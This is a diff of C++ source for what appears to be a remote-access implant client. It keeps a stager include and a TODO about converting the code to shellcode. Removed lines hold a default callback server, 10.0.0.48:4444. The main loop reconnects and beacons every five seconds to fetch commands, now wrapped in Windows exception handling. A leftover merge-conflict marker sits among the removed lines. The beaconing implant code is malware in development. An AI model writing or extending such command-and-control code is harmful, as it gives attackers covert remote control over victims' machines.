@@ -7,8 +7,6 @@
 
 // TODO: eventually convert to c code then asm then shell code?
 
-//#include "stager.h"
-
 
 #include "Client.h"
 #include "ComponentFactory.h"
@@ -18,21 +16,6 @@
 
 
 
-/*
-Client::Client() : 
-	transportLayer_(messageHandler_, "10.0.0.48", "4444") // Default server address
-{
-	messageHandler_.setTransportLayer(transportLayer_);
-}
-
-Client::Client(TCPtransportLayer transportLayer, std::string server, std::string port) : // TODO: transporter parameter isn't used 
-	transportLayer_(messageHandler_, server, port)
-{
-	messageHandler_.setTransportLayer(transportLayer_);
-}*/
-
-
-// TODO: delete?
 Client::Client() :
 	messageHandler_(),
 	transportLayerPtr_(
@@ -48,7 +31,6 @@ Client::Client() :
 	)
 {
 	messageHandler_.setTransportLayer(*transportLayerPtr_);
-	std::cout << "inside default constructor for client" << std::endl;
 }
 
 Client::Client(
@@ -70,30 +52,12 @@ Client::Client(
 			encoderType,
 			encryptorType)
 	)
-{}
-/*
-Client::Client() :
->>>>>>> 57908ee250d5f635af889a6bc389567a4b68d2ad
-	messageHandler_(),
-	transportLayerPtr_(
-		TransportLayerFactory::create(
-			messageHandler_,
-			host,
-			port,
-			transportType,
-			serializerType,
-			encoderType,
-			encryptorType
-		)
-	)
 {
 	messageHandler_.setTransportLayer(*transportLayerPtr_);
-	std::cout << "inside parameter constructor for client" << std::endl;
 }
-*/
+
 Client::~Client()
 {
-	std::cout << "Client being deconstructed" << std::endl;
 }
 
 bool Client::run()
@@ -114,23 +78,30 @@ bool Client::run()
 
 	*/
 
-
-	while (true)
+	__try
 	{
-		if (!transportLayerPtr_->isConnected())
+		while (true)
 		{
-			transportLayerPtr_->connect();    // Try to connect (handles if already connected)
-		}
-		
-		if (transportLayerPtr_->isConnected())
-		{
-			transportLayerPtr_->testMessage();
-			transportLayerPtr_->beacon();     // Send heartbeat + check commands... also receive() is called inside beacon
-			//transporter_.receive();
-			//transporter_.sendMessage();
-		}
+			if (!transportLayerPtr_->isConnected())
+			{
+				transportLayerPtr_->connect();
+			}
 
-		Sleep(5000);            // Wait 5 seconds
+			if (transportLayerPtr_->isConnected())
+			{
+				transportLayerPtr_->beacon();
+			}
+			std::cout << "before sleeping" << std::endl;
+			Sleep(5000);
+			std::cout << "after sleeping" << std::endl;
+		}
 	}
+	__except (EXCEPTION_EXECUTE_HANDLER)
+	{
+		std::cout << "CRITICAL: Exception in main loop: 0x" << std::hex << GetExceptionCode() << std::dec << std::endl;
+		// Try to reconnect or restart
+		return false;
+	}
+
 	return false;
 }
